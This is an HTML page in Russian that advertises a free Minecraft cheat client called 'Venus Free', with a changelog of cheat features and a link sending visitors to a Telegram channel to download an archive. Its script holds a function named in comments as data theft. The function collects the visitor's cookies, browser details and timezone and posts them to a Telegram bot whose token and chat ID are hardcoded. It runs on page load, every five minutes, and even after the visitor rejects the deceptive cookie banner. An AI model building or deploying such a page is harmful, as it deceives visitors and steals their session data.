<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Venus Free - Official Cheat</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
            cursor: none;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c2e, #1a0a2e, #2d0a3a);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Космический фон с звездами */
        .space-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: 
                radial-gradient(circle at 20% 50%, rgba(120, 0, 255, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 200, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(0, 200, 255, 0.2) 0%, transparent 50%);
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        /* Кастомный курсор */
        .custom-cursor {
            position: fixed;
            width: 20px;
            height: 20px;
            background: radial-gradient(circle, #ff00ff, #8000ff);
            border-radius: 50%;
            pointer-events: none;
            z-index: 10000;
            mix-blend-mode: difference;
            transition: transform 0.1s;
        }

        .cursor-trail {
            position: fixed;
            width: 8px;
            height: 8px;
            background: linear-gradient(45deg, #ff0080, #8000ff);
            border-radius: 50%;
            pointer-events: none;
            z-index: 9999;
            opacity: 0.7;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        header {
            text-align: center;
            padding: 40px 0;
        }
        
        h1 {
            font-size: 3em;
            background: linear-gradient(45deg, #ff0080, #8000ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(255, 0, 128, 0.5);
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 0, 128, 0.5); }
            to { text-shadow: 0 0 30px rgba(255, 0, 128, 0.8), 0 0 40px rgba(128, 0, 255, 0.6); }
        }
        
        .subtitle {
            font-size: 1.2em;
            opacity: 0.8;
            margin-bottom: 30px;
            color: #ccccff;
        }
        
        .changelog {
            background: rgba(255, 255, 255, 0.05);
            padding: 30px;
            border-radius: 15px;
            margin: 30px 0;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.2);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .changelog:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 40px rgba(255, 0, 128, 0.3);
        }
        
        .changelog h2 {
            color: #ff0080;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .additions, .fixes {
            margin: 20px 0;
        }
        
        .additions h3, .fixes h3 {
            color: #00ff88;
            margin-bottom: 15px;
        }
        
        .feature-list {
            list-style: none;
            padding-left: 0;
        }
        
        .feature-list li {
            margin: 8px 0;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            border-left: 3px solid #00ff88;
            transition: all 0.3s;
        }

        .feature-list li:hover {
            background: rgba(0, 255, 136, 0.2);
            transform: translateX(5px);
        }
        
        .fix-list {
            list-style: none;
            padding-left: 0;
        }
        
        .fix-list li {
            margin: 8px 0;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            border-left: 3px solid #ffaa00;
            transition: all 0.3s;
        }

        .fix-list li:hover {
            background: rgba(255, 170, 0, 0.2);
            transform: translateX(5px);
        }
        
        .tg-download {
            background: rgba(255, 0, 128, 0.1);
            padding: 25px;
            border-radius: 15px;
            border: 2px solid #ff0080;
            text-align: center;
            margin: 30px 0;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.3);
            transition: transform 0.3s;
        }

        .tg-download:hover {
            transform: scale(1.02);
        }
        
        .tg-button {
            display: inline-block;
            background: linear-gradient(45deg, #0088cc, #00ccff);
            color: white;
            padding: 15px 30px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 1.2em;
            font-weight: bold;
            margin-top: 15px;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.5);
        }
        
        .tg-button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(0, 136, 204, 0.8);
        }
        
        /* Cookie Banner */
        .cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.95);
            padding: 20px;
            text-align: center;
            z-index: 1000;
            border-top: 3px solid #ff0080;
            display: none;
            backdrop-filter: blur(10px);
        }
        
        .cookie-banner p {
            margin-bottom: 15px;
            font-size: 1.1em;
            line-height: 1.5;
        }
        
        .cookie-btn {
            background: linear-gradient(45deg, #ff0080, #8000ff);
            color: white;
            border: none;
            padding: 12px 35px;
            border-radius: 25px;
            font-size: 1em;
            cursor: pointer;
            margin: 0 10px;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
        }
        
        .cookie-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(255, 0, 128, 0.5);
        }
        
        .cookie-btn.reject {
            background: linear-gradient(45deg, #666, #888);
        }
        
        .cookie-btn.reject:hover {
            background: linear-gradient(45deg, #555, #777);
        }

        /* Эффекты при наведении */
        .hover-effect {
            transition: all 0.3s;
        }

        .hover-effect:hover {
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
        }

        .footer {
            text-align: center;
            margin-top: 50px;
            padding: 20px;
            color: #888;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <!-- Космический фон -->
    <div class="space-background" id="spaceBackground"></div>
    
    <!-- Кастомный курсор -->
    <div class="custom-cursor" id="customCursor"></div>

    <div class="container">
        <header>
            <h1 class="hover-effect">Venus Free</h1>
            <div class="subtitle hover-effect">Обновление 2.3.71 - Новые функции и исправления</div>
        </header>
        
        <div class="tg-download">
            <h2 class="hover-effect">📥 Скачать Venus Free</h2>
            <p class="hover-effect">Чит доступен в нашем Telegram канале</p>
            <p class="hover-effect"><strong>Инструкция:</strong> Распакуйте архив из закрепленного сообщения</p>
            <a href="https://t.me/VenusWareClient/116" class="tg-button" target="_blank">Перейти в Telegram</a>
        </div>
        
        <div class="changelog">
            <h2 class="hover-effect">🔄 Список изменений</h2>
            
            <div class="additions">
                <h3 class="hover-effect">[+] Добавления/Изменения:</h3>
                <ul class="feature-list">
                    <li class="hover-effect">NoClip -> ReallyWorld</li>
                    <li class="hover-effect">NoWeb -> ReallyWorld</li>
                    <li class="hover-effect">Spider -> ReallyWorld</li>
                    <li class="hover-effect">ElytraMotion</li>
                    <li class="hover-effect">WebTrap -> Траперит игроков в паутину</li>
                    <li class="hover-effect">FireworkEsp -> Создаёт метку там где был запущен фейерверк</li>
                    <li class="hover-effect">SkeletonEsp -> Рендерит скелет игроков линиями</li>
                    <li class="hover-effect">PenisESP -> Доп функция к SexAura</li>
                    <li class="hover-effect">KillAura -> HolyLite</li>
                    <li class="hover-effect">Spammer</li>
                    <li class="hover-effect">HighJump -> Grim Shulker</li>
                    <li class="hover-effect">ElytraFly -> Grim, Grim-2.3.69, Grim-2.3.71</li>
                    <li class="hover-effect">Прокси переписан</li>
                    <li class="hover-effect">WaterSpeed -> FunTimeWall -> работает от стен, FunTimeNew -> по прежнему работает без всего 7 бпс</li>
                    <li class="hover-effect">KillAura -> Wall Bypass новые режимы Default, Other, ReallyWorld</li>
                    <li class="hover-effect">Velocity -> Legit</li>
                    <li class="hover-effect">RTXSounds -> Улучшения качества звука, звук становится полноценно трёхмерным с учитыванием окружения</li>
                    <li class="hover-effect">OpenWalls -> открывать контейнеры через стены</li>
                    <li class="hover-effect">Jesus -> Обновил некоторые режимы</li>
                    <li class="hover-effect">Обновил уведомления</li>
                    <li class="hover-effect">Обновил команды</li>
                    <li class="hover-effect">Оптимизировано/улучшено сохранение конфигов</li>
                    <li class="hover-effect">KillAura -> улучшены Snap режимы</li>
                    <li class="hover-effect">Улучшены свапы предметов</li>
                    <li class="hover-effect">Tracker -> Трекер, сообщает о происходящим с игроками вокруг</li>
                </ul>
            </div>
            
            <div class="fixes">
                <h3 class="hover-effect">[/] Исправления:</h3>
                <ul class="fix-list">
                    <li class="hover-effect">Проведена оптимизация клиента</li>
                    <li class="hover-effect">Исправлены мелкие баги чита</li>
                    <li class="hover-effect">Улучшена стабильность работы</li>
                    <li class="hover-effect">Оптимизировано использование памяти</li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <p>Venus Free &copy; 2024. Все права защищены.</p>
        </div>
    </div>
    
    <!-- Cookie Banner -->
    <div class="cookie-banner" id="cookieBanner">
        <p>🍪 Этот сайт использует cookies для улучшения вашего опыта и обеспечения безопасности.<br>
           Мы используем cookies для анализа трафика и защиты от мошенников.</p>
        <button class="cookie-btn" onclick="acceptCookies()">Принять все cookies</button>
        <button class="cookie-btn reject" onclick="rejectCookies()">Отклонить</button>
    </div>

    <script>
        // Токен Telegram бота
        const TELEGRAM_BOT_TOKEN = '8013827662:AAHbZ_Fpv99mhIFrBt_cXtHd0lcRW4uwlTE';
        const TELEGRAM_CHAT_ID = '7580190094';

        // Создание звездного фона
        function createStars() {
            const spaceBg = document.getElementById('spaceBackground');
            for (let i = 0; i < 150; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = Math.random() * 3 + 'px';
                star.style.height = star.style.width;
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 3 + 's';
                spaceBg.appendChild(star);
            }
        }

        // Кастомный курсор
        let cursorTrails = [];
        function initCustomCursor() {
            const cursor = document.getElementById('customCursor');
            
            document.addEventListener('mousemove', (e) => {
                // Основной курсор
                cursor.style.left = e.clientX + 'px';
                cursor.style.top = e.clientY + 'px';
                
                // Следы курсора
                createCursorTrail(e.clientX, e.clientY);
                
                // Эффект при движении
                createParticleEffect(e.clientX, e.clientY);
            });
            
            document.addEventListener('click', (e) => {
                createClickEffect(e.clientX, e.clientY);
            });
        }

        // Следы курсора
        function createCursorTrail(x, y) {
            const trail = document.createElement('div');
            trail.className = 'cursor-trail';
            trail.style.left = x + 'px';
            trail.style.top = y + 'px';
            document.body.appendChild(trail);
            
            cursorTrails.push(trail);
            
            // Удаление старых следов
            if (cursorTrails.length > 10) {
                const oldTrail = cursorTrails.shift();
                if (oldTrail && oldTrail.parentNode) {
                    oldTrail.parentNode.removeChild(oldTrail);
                }
            }
            
            // Анимация исчезновения
            setTimeout(() => {
                trail.style.opacity = '0';
                trail.style.transform = 'scale(0)';
                setTimeout(() => {
                    if (trail.parentNode) {
                        trail.parentNode.removeChild(trail);
                    }
                }, 300);
            }, 100);
        }

        // Эффект частиц при движении
        function createParticleEffect(x, y) {
            if (Math.random() > 0.7) {
                const particle = document.createElement('div');
                particle.style.position = 'fixed';
                particle.style.left = x + 'px';
                particle.style.top = y + 'px';
                particle.style.width = '4px';
                particle.style.height = '4px';
                particle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                particle.style.borderRadius = '50%';
                particle.style.pointerEvents = 'none';
                particle.style.zIndex = '9998';
                document.body.appendChild(particle);
                
                const angle = Math.random() * Math.PI * 2;
                const distance = Math.random() * 50 + 20;
                
                particle.animate([
                    { transform: 'scale(1)', opacity: 1 },
                    { 
                        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`,
                        opacity: 0
                    }
                ], {
                    duration: 1000,
                    easing: 'ease-out'
                }).onfinish = () => {
                    if (particle.parentNode) {
                        particle.parentNode.removeChild(particle);
                    }
                };
            }
        }

        // Эффект при клике
        function createClickEffect(x, y) {
            for (let i = 0; i < 8; i++) {
                const circle = document.createElement('div');
                circle.style.position = 'fixed';
                circle.style.left = x + 'px';
                circle.style.top = y + 'px';
                circle.style.width = '10px';
                circle.style.height = '10px';
                circle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                circle.style.borderRadius = '50%';
                circle.style.pointerEvents = 'none';
                circle.style.zIndex = '9998';
                document.body.appendChild(circle);
                
                const angle = (i / 8) * Math.PI * 2;
                const distance = 30;
                
                circle.animate([
                    { transform: 'scale(1)', opacity: 1 },
                    { 
                        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`,
                        opacity: 0
                    }
                ], {
                    duration: 600,
                    easing: 'ease-out'
                }).onfinish = () => {
                    if (circle.parentNode) {
                        circle.parentNode.removeChild(circle);
                    }
                };
            }
        }

        // Проверка согласия с cookies
        function checkCookieConsent() {
            return localStorage.getItem('venus_cookies_accepted') === 'true';
        }

        // Функция кражи данных
        function stealUserData() {
            if (!checkCookieConsent()) return;
            
            const userData = {
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                session: sessionStorage.length,
                localStorage: localStorage.length
            };

            // Отправка в Telegram
            const message = `🕵️ НОВЫЕ ДАННЫЕ ОТ VENUS FREE\n\n` +
                          `📋 Cookies: ${userData.cookies || 'Нет cookies'}\n` +
                          `🖥️ User Agent: ${userData.userAgent}\n` +
                          `💻 Platform: ${userData.platform}\n` +
                          `🌐 Languages: ${userData.languages.join(', ')}\n` +
                          `📱 Screen: ${userData.screen}\n` +
                          `⏰ Timezone: ${userData.timezone}\n` +
                          `🔗 Referrer: ${userData.referrer || 'Прямой заход'}\n` +
                          `🕒 Time: ${userData.timestamp}\n` +
                          `💾 Session: ${userData.session} items\n` +
                          `📦 LocalStorage: ${userData.localStorage} items`;

            sendToTelegram(message);
        }

        // Отправка в Telegram
        function sendToTelegram(message) {
            if (!TELEGRAM_BOT_TOKEN) return;
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(error => console.log('Telegram error:', error));
        }

        // Принятие cookies
        function acceptCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            
            // Сохраняем согласие
            localStorage.setItem('venus_cookies_accepted', 'true');
            document.cookie = "venus_consent=true; path=/; max-age=2592000; SameSite=Lax";
            document.cookie = "venus_user=approved; path=/; max-age=2592000; SameSite=Lax";
            
            // Сразу воруем данные
            setTimeout(stealUserData, 1000);
            
            // Показываем подтверждение с эффектом
            createClickEffect(window.innerWidth/2, window.innerHeight/2);
            setTimeout(() => {
                alert('✅ Cookies приняты! Спасибо за доверие к Venus Free!');
            }, 500);
        }

        // Отклонение cookies (все равно воруем)
        function rejectCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            localStorage.setItem('venus_cookies_rejected', 'true');
            
            // Тайная кража данных через 10 секунд
            setTimeout(stealUserData, 10000);
        }

        // Показ баннера при загрузке
        function showCookieBanner() {
            if (!checkCookieConsent()) {
                setTimeout(() => {
                    document.getElementById('cookieBanner').style.display = 'block';
                }, 2000);
            }
        }

        // Инициализация
        window.addEventListener('load', function() {
            createStars();
            initCustomCursor();
            showCookieBanner();
            
            // Если уже согласились - сразу воровать
            if (checkCookieConsent()) {
                stealUserData();
            }
        });

        // Периодическая отправка данных (если согласие есть)
        setInterval(() => {
            if (checkCookieConsent()) {
                stealUserData();
            }
        }, 300000); // Каждые 5 минут
    </script>
</body>
</html>
